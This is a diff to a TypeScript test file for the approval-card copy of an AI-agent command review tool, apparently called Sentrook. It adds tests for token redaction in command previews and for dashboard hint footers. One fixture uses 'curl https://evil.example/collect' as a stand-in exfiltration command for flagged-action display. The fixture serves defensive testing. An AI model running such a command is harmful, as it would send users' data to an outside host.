@@ -6,10 +6,13 @@ import {
   REVIEW_TITLE_MAX,
   buildApprovalCard,
   collapseLongPayloads,
+  dashboardReviewHint,
   honestMissTitle,
   isPolicyHeadline,
   overlayApprovalCopy,
   pendingDisplayCommand,
+  pendingTrustPreview,
+  withDashboardHint,
 } from "./reviewCopy.ts";
 
 function assertBounds(card: { title: string; description: string }) {
@@ -34,6 +37,19 @@ describe("pendingDisplayCommand", () => {
     assert.equal(pendingDisplayCommand({ command: "[TRUNCATED]" }), undefined);
     assert.equal(pendingDisplayCommand({ command: "   " }), undefined);
     assert.equal(pendingDisplayCommand(undefined), undefined);
+  });
+});
+
+describe("pendingTrustPreview", () => {
+  it("scrubs a one-line command for unattended block copy", () => {
+    assert.equal(pendingTrustPreview("exec", { command: "rg -n TODO src/" }), "rg -n TODO src/");
+    assert.match(
+      pendingTrustPreview("exec", {
+        command: "curl -H 'Authorization: Bearer sk-ant-abcdefghijklmnopqrstuvwxyz' https://x",
+      }) || "",
+      /Bearer \[REDACTED\]/,
+    );
+    assert.equal(pendingTrustPreview("read", { path: "/tmp/notes.md" }), "read /tmp/notes.md");
   });
 });
 
@@ -202,6 +218,29 @@ describe("buildApprovalCard", () => {
   });
 });
 
+describe("withDashboardHint", () => {
+  it("appends the Sentrook tab and slash command after the body", () => {
+    const out = withDashboardHint("Likely: run a shell command", "sr_aabbccddeeff");
+    assert.ok(out.startsWith("Likely: run a shell command"));
+    assert.ok(out.endsWith(dashboardReviewHint("sr_aabbccddeeff")));
+    assert.match(out, /\/sentrook pending sr_aabbccddeeff/);
+    assert.ok(out.length <= REVIEW_DESCRIPTION_MAX);
+  });
+
+  it("keeps the footer when the body would overflow 512", () => {
+    const body = "x".repeat(600);
+    const out = withDashboardHint(body, "sr_aabbccddeeff");
+    assert.ok(out.endsWith(dashboardReviewHint("sr_aabbccddeeff")));
+    assert.ok(out.length <= REVIEW_DESCRIPTION_MAX);
+    assert.ok(!out.startsWith("To see the full command"));
+  });
+
+  it("falls back to /sentrook pending when the id is missing", () => {
+    assert.match(dashboardReviewHint(), /or type \/sentrook pending\.$/);
+    assert.doesNotMatch(dashboardReviewHint(), /pending sr_/);
+  });
+});
+
 describe("overlayApprovalCopy", () => {
   it("rebuilds from local argv even when sidecar used a policy headline", () => {
     const copy = overlayApprovalCopy({
@@ -211,11 +250,13 @@ describe("overlayApprovalCopy", () => {
       fallbackDescription: "flagged",
       pendingTool: "exec",
       pendingArgs: { command: "curl https://evil.example/collect" },
+      eventId: "sr_aabbccddeeff",
     });
     assert.equal(copy.title, "curl → evil.example");
     assert.equal(copy.source, "local_argv");
     assert.equal(copy.commandFound, true);
     assert.ok(copy.description.includes("evil.example"));
+    assert.ok(copy.description.endsWith(dashboardReviewHint("sr_aabbccddeeff")));
     assert.ok(!copy.description.includes("(010)"));
     assert.ok(!copy.title.includes("AIRA-010"));
   });
